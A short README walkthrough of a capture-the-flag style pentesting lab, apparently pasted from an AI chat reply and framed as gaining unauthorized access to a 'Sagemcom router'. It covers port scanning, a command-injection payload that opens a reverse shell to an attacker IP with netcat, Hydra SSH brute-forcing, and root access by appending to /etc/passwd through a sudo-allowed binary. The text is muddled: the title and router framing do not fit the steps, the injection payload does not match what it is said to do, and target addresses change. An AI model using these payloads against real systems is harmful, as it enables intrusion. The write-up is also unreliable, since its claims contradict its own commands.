# Anas-EPI-Basic-pentesting-2-walkthrough-


Sure, here's how you could structure the walkthrough into a README file for a GitHub page:

markdown
Copy code
# Walkthrough: Hacking into Sagemcom Router

This walkthrough outlines the steps taken to gain unauthorized access to a Sagemcom router, exploiting various vulnerabilities and weaknesses.

## Initial Reconnaissance

I started with a port scan using nmap to identify open ports on the target:

```bash
nmap -A -sC -sV -p- 192.168.42.160
This revealed 2 open ports.

Exploiting Command Injection
After discovering a correct username and password combination, I captured the request in Burp Suite and attempted a simple command injection attack, successfully printing out the /etc/passwd file:

bash
Copy code
radio=ls+-l|nc -e /bin/bash 192.168.43.2 9898&submit=Run
A quick wget command allowed me to download the password file:

bash
Copy code
wget 192.168.43.160:8000/old-passwords.bak
Password Cracking
To crack the passwords, I created a users.txt file with all three possible usernames and used Hydra for brute-forcing:

bash
Copy code
hydra -L ~/Downloads/users.txt -P ~/Downloads/old-passwords.bak ssh://192.168.43.160
Privilege Escalation
Despite finding a shell script with SUID bit set, I couldn't escalate privileges directly. However, further exploration revealed another email with a password, allowing me to escalate privileges.

Root Access
I discovered that Charles had permissions to execute /usr/bin/teehee as root without a password. Leveraging this, I added a new user with root privileges to /etc/passwd and gained root access.

bash
Copy code
sudo teehee -a /etc/passwd
Retrieving the Flag
Finally, I located and printed out the root flag:

bash
Copy code
cat flag.txt
